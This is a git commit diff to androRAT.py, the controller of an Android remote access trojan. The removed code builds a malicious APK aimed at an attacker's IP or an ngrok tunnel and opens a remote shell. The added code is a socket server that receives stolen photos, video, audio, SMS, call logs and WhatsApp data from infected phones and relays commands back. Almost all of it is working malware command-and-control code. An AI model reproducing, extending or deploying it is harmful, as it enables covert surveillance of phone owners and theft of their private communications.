65afa371b1e55b8ec4ad07c3ea834296acd465c2
Azdine_kirasse <92144081+kirasse12@users.noreply.github.com>
2025-05-03 07:25:11 +0200

    Update androRAT.py

--- androRAT.py
+++ androRAT.py
@@ -1,64 +1,46 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+import socket
+import threading
+import os
+from utils import receive_data, save_file, handle_client_command
 
-from utils import *
-import argparse
-import sys
-import platform
-try:
-    from pyngrok import ngrok,conf
-except ImportError as e:
-    print(stdOutput("error")+"\033[1mpyngrok not found");
-    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
-    exit()
-    
-clearDirec()
+SERVER_IP = '0.0.0.0'
+SERVER_PORT = 8080
+BUFFER_SIZE = 4096
+DATA_DIR = 'data'
 
-#                     _           _____         _______
-#     /\             | |         |  __ \     /\|__   __|
-#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
-#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
-#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
-# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
-#                                        - By karma9874
+if not os.path.exists(DATA_DIR):
+    os.makedirs(DATA_DIR)
 
+def handle_client(conn, addr):
+    print(f"[+] Connexion de {addr}")
+    try:
+        while True:
+            data_type = receive_data(conn)
+            if not data_type:
+                print("[-] Connexion perdue.")
+                break
 
-parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
-parser.add_argument('--build',help='For Building the apk',action='store_true')
-parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
-parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
-parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
-parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
-parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
-parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
-args = parser.parse_args()
+            print(f"[>] Type de données reçu : {data_type}")
 
+            if data_type in ["image", "video", "audio", "sms", "call_logs", "whatsapp"]:
+                save_file(conn, data_type, DATA_DIR)
+            else:
+                handle_client_command(conn, data_type)
+    except Exception as e:
+        print(f"[!] Erreur avec le client {addr} : {e}")
+    finally:
+        conn.close()
+        print(f"[-] Déconnecté de {addr}")
 
+def start_server():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+        server.bind((SERVER_IP, SERVER_PORT))
+        server.listen(5)
+        print(f"[+] Serveur en écoute sur {SERVER_IP}:{SERVER_PORT}")
+        while True:
+            conn, addr = server.accept()
+            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
+            thread.start()
 
-if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.8 :
-    print(stdOutput("error")+"\033[1mPython version should be between 3.6 to 3.8")
-    sys.exit()
-
-if args.build:
-    port_ = args.port
-    icon=True if args.icon else None
-    if args.ngrok:
-        conf.get_default().monitor_thread = False
-        port = 8000 if not port_ else port_
-        tcp_tunnel = ngrok.connect(port, "tcp")
-        ngrok_process = ngrok.get_ngrok_process()
-        domain,port = tcp_tunnel.public_url[6:].split(":")
-        ip = socket.gethostbyname(domain)
-        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
-        build(ip,port,args.output,True,port_,icon)
-    else:
-        if args.ip and args.port:
-            build(args.ip,port_,args.output,False,None,icon)
-        else:
-            print(stdOutput("error")+"\033[1mArguments Missing")
-
-if args.shell:
-    if args.ip and args.port:
-        get_shell(args.ip,args.port) 
-    else:
-        print(stdOutput("error")+"\033[1mArguments Missing")
+if __name__ == "__main__":
+    start_server()
